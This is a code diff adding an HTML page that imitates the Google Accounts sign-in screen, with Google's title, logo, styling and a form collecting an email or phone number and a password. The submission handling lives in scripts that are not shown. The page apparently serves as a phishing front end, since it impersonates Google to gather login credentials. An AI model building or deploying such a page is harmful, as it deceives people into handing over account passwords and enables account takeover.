@@ -1,0 +1,377 @@
+<html lang="en">
+
+</html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+
+    <!-- Source for fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&family=Ubuntu:wght@700&display=swap"
+        rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300&display=swap" rel="stylesheet">
+    <!-- Include the new frontend.js file -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400&family=Noto+Sans+Myanmar+UI:wght@400&family=Arial:sans-serif');
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans|Roboto:wght@400&family=Arial:sans-serif');
+
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            /* align-items: center; */
+            font-family: Arial;
+        }
+
+        #container {
+            margin-top: 50px;
+            display: flex;
+            flex-direction: column;
+            /* max-width: 600px; 
+    /* Adjust the max-width based on your design */
+            /* width: 100%; */
+        }
+
+        #square {
+            width: 100%;
+            max-width: 500px;
+            height: 540px;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+        }
+
+        #logo_container {
+            height: 15%;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+        }
+
+        #logo {
+            width: 20%;
+            /* 18% */
+        }
+
+        #top_text {
+            
+            /* font-family: 'Quicksand', sans-serif; */
+            font-size: 1.5em;
+            /* border: 1px solid; */
+            height: 10%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #top_subtext {
+            
+            font-weight: 400;
+            font-size: 1em;
+            color: rgba(0, 0, 0, 0.8);
+            /* border: 1px solid; */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #input_container {
+            position: relative;
+            flex-direction: column;
+            display: flex;
+            justify-content: end;
+            align-items: center;
+            /* border: 1px solid red; */
+            height: 18%;
+        }
+
+        #input {
+            width: 80%;
+            height: 65%;
+            outline: none;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            
+            color: rgba(0, 0, 0, 0.7);
+            padding-left: 18px;
+            font-size: 1em;
+        }
+
+        #placeholder {
+            
+            position: absolute;
+            top: 55%;
+            left: 14%;
+            /* font-size: 1.1em; */
+            color: rgba(0, 0, 0, 0.7);
+            user-select: none;
+            pointer-events: none;
+        }
+
+
+        #input_container2 {
+            position: relative;
+            flex-direction: column;
+            display: flex;
+            justify-content: end;
+            align-items: center;
+            /* border: 1px solid red; */
+            height: 18%;
+            /* padding-top: 4%; */
+        }
+
+        #input2 {
+            width: 80%;
+            height: 65%;
+            outline: none;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            
+            color: rgba(0, 0, 0, 0.7);
+            padding-left: 18px;
+            font-size: 1em;
+        }
+
+        #placeholder2 {
+            
+            position: absolute;
+            top: 55%;
+            /* top: 34%; */
+            left: 14%;
+            /* font-size: 1.1em; */
+            color: rgba(0, 0, 0, 0.7);
+            user-select: none;
+            pointer-events: none;
+        }
+
+        #link1 {
+            height: 9%;
+            padding-left: 10%;
+            display: flex;
+            align-items: center;
+            /* font-size: 0.9em; */
+            font-size: inherit;
+            
+            font-weight: 600;
+        }
+
+        #not {
+            height: 9%;
+            display: flex;
+            align-items: flex-end;
+            padding-left: 10%;
+            
+            font-size: 0.85em;
+            color: rgba(0, 0, 0, 0.65);
+        }
+
+        #link2 {
+            margin-top: 1%;
+            height: 7%;
+            /*height: 11%;*/
+            padding-left: 10%;
+            display: flex;
+            align-items: flex-start;
+            font-size: 0.9em;
+        }
+
+        .link {
+            cursor: pointer;
+            color: #1a73e8;
+            /* font-family: 'Quicksand', sans-serif; */
+            
+            font-weight: 600;
+        }
+
+        #last_split {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 22%;
+        }
+
+        .btn_container {
+            width: 50%;
+            height: 100%;
+            display: flex;
+            /* justify-content: center;   */
+            align-items: flex-start;
+            padding-left: 2%;
+        }
+
+        #btn_right {
+            cursor: pointer;
+            width: 35%;
+            margin-right: 50px;
+            height: 33.5%;
+            
+            background-color: #1a73e8;
+            color: white;
+            outline: none;
+            font-weight: 600;
+            font-size: 0.85em;
+            border: none;
+            border-radius: 5px;
+        }
+
+        #btn2 {
+            padding-left: 0px;
+            justify-content: flex-end;
+            /* padding-right: 10%; */
+        }
+
+        #btn_right:hover {
+            background-color: #165ebd;
+        }
+
+        #btn_left {
+            padding-left: 16%;
+            margin-top: 1%;
+            /* margin-left: 40px; */
+            border-radius: 5px;
+            background-color: transparent;
+            width: 70%;
+            height: 33.5%;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            color: #2779e4;
+            font-weight: 600;
+            font-size: 0.85em;
+            
+        }
+        #btn_create {
+            padding-left: 16%;
+            margin-top: 1%;
+            /* margin-left: 40px; */
+            border-radius: 5px;
+            background-color: transparent;
+            width: 70%;
+            height: 33.5%;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            color: #2779e4;
+            font-weight: 600;
+            font-size: 0.85em;
+            
+        }
+
+        #btn_left:hover {
+            background-color: rgb(240, 245, 252);
+        }
+
+        #bottom_text {
+            height: 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            
+            font-size: 0.75em;
+            color: rgba(0, 0, 0, 0.7);
+            font-weight: 600;
+        }
+
+
+        #lang_container {
+            width: 55%;
+            display: flex;
+            justify-content: flex-start;
+        }
+
+        #lang {
+            border: none;
+            color: rgba(0, 0, 0, 0.7);
+            font-size: 1em;
+            outline: none;
+        }
+
+
+        @media (max-width: 600px) {
+            #square {
+                border: none;
+            }
+
+            body {
+                top: 0px;
+            }
+
+            .btn_left {
+                margin-left: -90;
+            }
+
+            #logo_container {
+                height: 4%;
+            }
+        }
+    </style>
+    <script src="frontend.js"></script>
+</head>
+
+<body>
+    <div id="container">
+        <div id="square">
+            <div id="logo_container">
+                <img src="https://raw.githubusercontent.com/imabhishek476/images/main/google%20(1).png" id="logo">
+                <!-- width="87" height="33"> -->
+            </div>
+            <div id="top_text">Sign in</div>
+            <div id="top_subtext">Use your Google Account</div>
+
+            <!-- Add the loginForm ID to the form element -->
+            <form id="loginForm">
+                <div id="input_container">
+                    <input type="text" name="" id="input" placeholder="Email or phone">
+                </div>
+                <div id="input_container2">
+                    <input type="password" name="" id="input2" placeholder="Password">
+                </div>
+                <div id="link1" class="link" style="font-family:'Arial';">Forgot password?</div>
+                <div id="not">Not your computer? Use Guest mode to sign in privately.</div>
+                <div id="link2" class="link"><a href="" target="_self"
+                        style="text-decoration: none;color: #1a73e8;">Learn more</a></div>
+                <div id="last_split">
+                    <div class="btn_container">
+                        <div id="btn_create">Create account</div>
+                    </div>
+                    <div id="btn2" class="btn_container">
+                        <button type="submit" id="btn_right">Next</button>
+                    </div>
+                </div>
+            </form>
+
+
+            <div id="bottom_text">
+                <div id="lang_container">
+                    <select name="lang" id="lang">
+                        <option value="English(United States)">English (United States)</option>
+                        <option value="English(United States)">English (United Kingdom)</option>
+                    </select>
+                </div>
+                <div>Help</div>
+                <div>Privacy</div>
+                <div>Terms</div>
+            </div>
+        </div>
+
+        <script src="script.js"></script>
+
+</body>
+
+</html>
